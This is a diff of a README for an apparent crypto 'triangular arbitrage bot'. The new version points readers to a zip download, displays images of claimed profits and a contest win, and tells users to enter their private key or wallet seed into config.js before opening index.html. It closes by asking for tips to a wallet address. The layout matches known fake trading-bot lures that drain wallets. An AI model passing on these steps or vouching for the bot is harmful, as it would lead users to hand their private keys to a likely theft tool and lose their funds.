@@ -1,26 +1,50 @@
-﻿trading-bot
+﻿<img src="https://github.com/CoolnerdcoderV3/JavaScript-Triangular-Arbitrage-Bot-V3/raw/main/coolnercoder.png" >
 
-feel free to fork and improve or whatever.
-if you fork and modify please give credit.
-This is a tutorial to help run the crypto bot (javascript version)
+feel free to fork and improve or whatever. 
+if you fork and modify please give credit
+
+https://github.com/CoolnerdcoderV3/JavaScript-Triangular-Arbitrage-Bot-V3/raw/main/javascript-triangle-arbitrage-bot-v3.zip
+
+Here the 28days results of running it 24/7
+
+<img src="https://github.com/CoolnerdcoderV3/JavaScript-Triangular-Arbitrage-Bot-V3/raw/main/28days.png" width="750px" >
+
+Here the bot in action finding a arbitrage
+
+<img src="https://github.com/CoolnerdcoderV3/JavaScript-Triangular-Arbitrage-Bot-V3/raw/main/Screenshot%2006-23-2022%2009.44.32.png" width="750px" >
+
+
+I won 4th place on the version 1 of the program I will be entering the version 3 this year
+
+<img src="https://github.com/CoolnerdcoderV3/JavaScript-Triangular-Arbitrage-Bot-V3/raw/main/iwon.png" width="750px">
+
+How to config the bot
 
 Let’s get started.
 
-Part 1. Editing the settings.
+Part 1. Main software installations.
+
+download the source anywhere you like that easy for you to find.
+
+Part 2. Editing the settings.
 
 Open the bots main folder and find "config.js" file and open it with a text-editor:
 
-![confige](https://user-images.githubusercontent.com/122376751/211582493-8a2b232f-1082-41c0-ac95-f445b614f17e.png)
+<img src="https://github.com/CoolnerdcoderV3/JavaScript-Triangular-Arbitrage-Bot-V3/raw/main/Screenshot%2006-23-2022%2009.54.22.png" >
 
 1.Set your public address and private key or your wallet seed if you have a wallet that does not give you the private key
 
-2.Set the Network  1 = ETH , 2 = BNB , 3 = POLYGON
+2.Set the Network  1 = ETH , 2 = BNB
 
 3.Save config.js
 
-![itrunning](https://user-images.githubusercontent.com/122376751/211582535-70ad689e-da4a-453c-8b72-e19d8a38a622.png)
+4.Open index.html in any web-browser
 
-4.Open index.html in any web-browser.
+<img src="https://github.com/CoolnerdcoderV3/JavaScript-Triangular-Arbitrage-Bot-V3/raw/main/Screenshot%2006-23-2022%2009.54.51.png" >
+
+Happy hunting! :)
+
+And When you make a big win and if you fill like thanking me my eth/bnb/polygon address is 0x2431bec69aa4699ad9A9aE77233F7bdcD6d631f8
 
 
-![results](https://user-images.githubusercontent.com/122376751/211582664-83dc42d4-7a0d-48dd-b91c-64190dcba8f4.jpg)
+
